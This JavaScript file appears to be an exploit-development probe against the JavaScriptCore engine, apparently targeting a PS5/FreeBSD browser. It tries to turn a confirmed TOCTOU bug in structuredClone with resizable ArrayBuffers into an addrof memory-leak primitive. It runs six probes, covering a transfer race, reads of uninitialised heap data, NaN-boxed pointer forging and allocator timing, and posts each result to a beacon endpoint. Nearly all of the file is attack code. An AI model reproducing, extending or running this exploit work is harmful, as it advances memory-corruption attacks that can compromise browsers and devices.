/* p76-addrof — Build addrof primitive using confirmed R/W within maxByteLength
 * CONFIRMED: write data → shrink → TOCTOU clone reads written data
 * CONFIRMED: W2 Proxy set writes past logical end (within maxByteLength)
 *
 * Strategy for addrof:
 * 1. Allocate a LARGE RAB (maxByteLength = large)
 * 2. Use the RAB's OOB zone to overlap with JSC heap metadata
 *    → Problem: RAB backing stores are in Gigacage, isolated from JSC objects
 * 3. Alternative: Use structuredClone to serialize a JS object reference,
 *    then TOCTOU-read the serialized bytes → contains pointer!
 * 4. Alternative: Use W2 to write a marker, then use another bug to
 *    interpret it as a different type
 *
 * NEW APPROACH: structuredClone serializes objects into a byte stream.
 * If we can observe the raw serialized bytes, they contain internal pointers.
 * The TOCTOU bug gives us the serialized buffer — can we extract pointers from it?
 *
 * Beacon prefix: V76A-
 */
(function(){
"use strict";
var RUN_ID = "v76a" + Math.random().toString(36).slice(2,12);
var PREFIX = "V76A-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,900)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press76-addrof primitive");

/* ====== A1: Type confusion via RAB + DataView ====== */
function test_A1() {
  var r = {};
  try {
    // Create RAB, put a float64 value in it, shrink, then TOCTOU-read as Uint8Array
    // This isn't type confusion per se, but tests if we can read raw float bits

    var rab = new ArrayBuffer(64, { maxByteLength: 64 });
    var f64 = new Float64Array(rab);
    var u8 = new Uint8Array(rab);

    // Write a known float64 value
    f64[0] = 1.1; // IEEE754: 0x3FF199999999999A
    r.byte0 = u8[0]; r.byte1 = u8[1]; r.byte7 = u8[7];

    // Write a pointer-like value as float64
    // In JSC, tagged pointers use NaN-boxing: pointers have 0xFFFE prefix
    // If we can write a specific bit pattern and read it back as a pointer...
    var dv = new DataView(rab);
    // Write 0xFFFE000012345678 (a JSC-tagged pointer pattern)
    dv.setFloat64(8, -1.9711828979195205e+303, false); // some NaN-boxed value
    r.readBack = dv.getFloat64(8, false);
    r.rawHi = dv.getUint32(8, false);
    r.rawLo = dv.getUint32(12, false);

    // Can we create a float64 that JSC interprets as an object reference?
    // JSC NaN-boxing on 64-bit: if top 16 bits are 0xFFFE → it's a pointer
    // We need to know a valid JSC heap address to forge one

    r.test = "raw float64 I/O works";
  } catch(e) { r.err = e.message.slice(0,80); }
  B("A1-FLOAT-RAW", r);
}

/* ====== A2: Leak ArrayBuffer backing pointer via internal structure ====== */
function test_A2() {
  var r = {};
  try {
    // In JSC, an ArrayBuffer's JSCell contains a pointer to its backing store.
    // If we can read a JSArrayBuffer's raw memory, we'd find the backing ptr.
    // Can we somehow get the raw bytes of a JSCell?

    // Approach: create many ArrayBuffers with known backing content,
    // then use TOCTOU to read a large chunk and search for the pattern

    var marker = new ArrayBuffer(32);
    var mv = new Uint8Array(marker);
    for (var i = 0; i < 32; i++) mv[i] = 0xDE;

    // The marker AB's backing store contains 0xDEDEDEDE...
    // If we can find this pattern in a TOCTOU read, we've found the AB

    var rab = new ArrayBuffer(65536, { maxByteLength: 65536 });
    var u8 = new Uint8Array(rab);
    // Fill with zeros
    for (var j = 0; j < 65536; j++) u8[j] = 0;

    // TOCTOU read the whole thing after shrink
    var obj = Object.create(null);
    obj.buf = rab;
    Object.defineProperty(obj, 'zz', { enumerable: true, get: function() {
      rab.resize(16);
      return 1;
    }});

    var cloned = structuredClone(obj);
    var cv = new Uint8Array(cloned.buf);
    r.clonedLen = cloned.buf.byteLength;

    // Search for any non-zero data (potential heap metadata)
    var nonZero = 0;
    var firstNZ = -1;
    var nzSamples = [];
    for (var k = 16; k < cv.length; k++) {
      if (cv[k] !== 0) {
        nonZero++;
        if (firstNZ === -1) firstNZ = k;
        if (nzSamples.length < 20) nzSamples.push(k + ":" + cv[k]);
      }
    }

    r.nonZero = nonZero;
    r.firstNZ = firstNZ;
    r.nzSamples = nzSamples.join(",");
    r.HAS_LEAKED_DATA = nonZero > 0;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("A2-BACKING-LEAK", r);
}

/* ====== A3: Confusion via structuredClone transfer list ====== */
function test_A3() {
  var r = {};
  try {
    // structuredClone(value, { transfer: [...] }) transfers ownership.
    // What if we transfer a buffer and in a getter create a view on it?
    // The transfer should detach the original, but if we race...

    var ab = new ArrayBuffer(128);
    var u8 = new Uint8Array(ab);
    for (var i = 0; i < 128; i++) u8[i] = 0xCC;

    var obj = Object.create(null);
    obj.buf = ab;
    var viewAfterTransfer = null;
    Object.defineProperty(obj, 'zz', { enumerable: true, get: function() {
      // Try to create a view DURING transfer
      try {
        viewAfterTransfer = new Uint8Array(ab);
        r.viewCreated = true;
        r.viewLen = viewAfterTransfer.length;
      } catch(e) {
        r.viewErr = e.message.slice(0,40);
      }
      return 1;
    }});

    try {
      var cloned = structuredClone(obj, { transfer: [ab] });
      r.transferOK = true;
      r.origDetached = ab.byteLength === 0;
      r.clonedBufLen = cloned.buf.byteLength;

      // If viewAfterTransfer was created, can we use it to access the detached buffer?
      if (viewAfterTransfer) {
        try {
          r.viewByte0 = viewAfterTransfer[0]; // should throw or return undefined
          r.viewReadable = viewAfterTransfer[0] !== undefined;
        } catch(e) {
          r.viewReadErr = e.message.slice(0,40);
        }
      }
    } catch(e) {
      r.transferErr = e.name + ":" + e.message.slice(0,50);
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("A3-TRANSFER-RACE", r);
}

/* ====== A4: JSC tagged value leak via valueOf confusion ====== */
function test_A4() {
  var r = {};
  try {
    // JSC stores values as NaN-boxed 64-bit. Can we extract raw bits?
    // Approach: store an object reference into a TypedArray somehow

    // Float64Array trick: JSC stores doubles as IEEE754.
    // Object pointers are stored differently (tagged).
    // Can we get JSC to store a tagged pointer into a Float64Array element?

    var f64 = new Float64Array(1);
    var u8 = new Uint8Array(f64.buffer);

    // Normal number
    f64[0] = 3.14;
    r.piHex = [];
    for (var i = 0; i < 8; i++) r.piHex.push(u8[i].toString(16).padStart(2,'0'));
    r.piHex = r.piHex.join("");

    // Try to store an object — should get coerced to NaN
    var obj = { valueOf: function() { return {}; } };
    try {
      f64[0] = obj;
      r.objStore = "OK";
      r.objVal = f64[0]; // NaN?
      r.objHex = [];
      for (var j = 0; j < 8; j++) r.objHex.push(u8[j].toString(16).padStart(2,'0'));
      r.objHex = r.objHex.join("");
    } catch(e) {
      r.objStoreErr = e.message.slice(0,40);
    }

    // Store array with object — does it leak the pointer?
    var arr = [1.1, 2.2, {}]; // mixed array — JSC uses butterfly storage
    var leak = [];
    for (var k = 0; k < arr.length; k++) {
      f64[0] = typeof arr[k] === 'number' ? arr[k] : NaN;
      leak.push([]);
      for (var m = 0; m < 8; m++) leak[k].push(u8[m].toString(16).padStart(2,'0'));
      leak[k] = leak[k].join("");
    }
    r.arrHex = leak.join("|");

  } catch(e) { r.err = e.message.slice(0,80); }
  B("A4-TAGGED-LEAK", r);
}

/* ====== A5: Prototype pollution → type confusion attempt ====== */
function test_A5() {
  var r = {};
  try {
    // Can we confuse an ArrayBuffer view's type by manipulating prototypes?
    var rab = new ArrayBuffer(64, { maxByteLength: 64 });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < 64; i++) u8[i] = i;

    // Create a Float64Array view on same buffer
    var f64 = new Float64Array(rab);
    r.f64_0 = f64[0]; // reads bytes 0-7 as float64

    // Hex dump first 8 bytes
    r.bytes = [];
    for (var j = 0; j < 8; j++) r.bytes.push(u8[j]);
    r.bytes = r.bytes.join(",");

    // Can we read the same data as both Uint8Array and Float64Array?
    // (This is normal — same backing store, different views)
    r.multiView = true;

    // What if we store a JSC-meaningful bit pattern?
    // JSC NaN-boxing: double = 0xFFF80000_00000000 is NaN
    // Object ptr = 0x0000_XXXX_XXXX_XXXX
    // Int32 = 0xFFFF_0000_IIII_IIII
    var dv = new DataView(rab);

    // Write a pattern that looks like a JSC cell pointer in the format used on FreeBSD amd64
    // Typical heap addresses on PS5/FreeBSD: 0x0000_00XX_XXXX_XXXX
    dv.setBigUint64(0, 0x0000007F12345678n, true); // little-endian
    r.asFloat = f64[0]; // what does JSC see this as?
    r.asFloatStr = f64[0].toString();
    r.asU32Lo = dv.getUint32(0, true);
    r.asU32Hi = dv.getUint32(4, true);

    // BigInt support?
    r.hasBigInt = typeof BigInt !== 'undefined';
    if (r.hasBigInt) {
      r.asBigInt = dv.getBigUint64(0, true).toString(16);
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("A5-MULTIVIEW", r);
}

/* ====== A6: Measure RAB backing allocation size ====== */
function test_A6() {
  var r = {};
  try {
    // Allocate RABs of various maxByteLength, measure timing to detect
    // allocator bucket boundaries

    var sizes = [16, 32, 64, 128, 256, 512, 1024, 2048, 4096, 8192, 16384, 32768, 65536];
    var timings = [];

    for (var s = 0; s < sizes.length; s++) {
      var t0 = performance.now();
      var rabs = [];
      for (var i = 0; i < 100; i++) {
        rabs.push(new ArrayBuffer(sizes[s], { maxByteLength: sizes[s] }));
      }
      var dt = performance.now() - t0;
      timings.push(sizes[s] + ":" + dt.toFixed(1));
      rabs = null;
    }

    r.timings = timings.join("|");

    // Also: test if RAB addresses are predictable by checking content after grow
    var rab = new ArrayBuffer(16, { maxByteLength: 4096 });
    var u8 = new Uint8Array(rab);
    for (var j = 0; j < 16; j++) u8[j] = 0xFF;
    rab.resize(4096);

    // Bytes 16-4095 should be zero if freshly allocated
    var nonZeroGrow = 0;
    var growSamples = [];
    for (var k = 16; k < 4096; k++) {
      if (u8[k] !== 0) {
        nonZeroGrow++;
        if (growSamples.length < 10) growSamples.push(k + ":" + u8[k]);
      }
    }
    r.nonZeroGrow = nonZeroGrow;
    r.growSamples = growSamples.join(",");
    r.UNINITIALIZED = nonZeroGrow > 0; // non-zero = uninitialized heap data!

  } catch(e) { r.err = e.message.slice(0,80); }
  B("A6-ALLOC", r);
}

/* ====== Run ====== */
try {
  test_A1();
  setTimeout(test_A2, 300);
  setTimeout(test_A3, 600);
  setTimeout(test_A4, 900);
  setTimeout(test_A5, 1200);
  setTimeout(test_A6, 1500);
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 2000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe76-done"); }, 16000);
})();
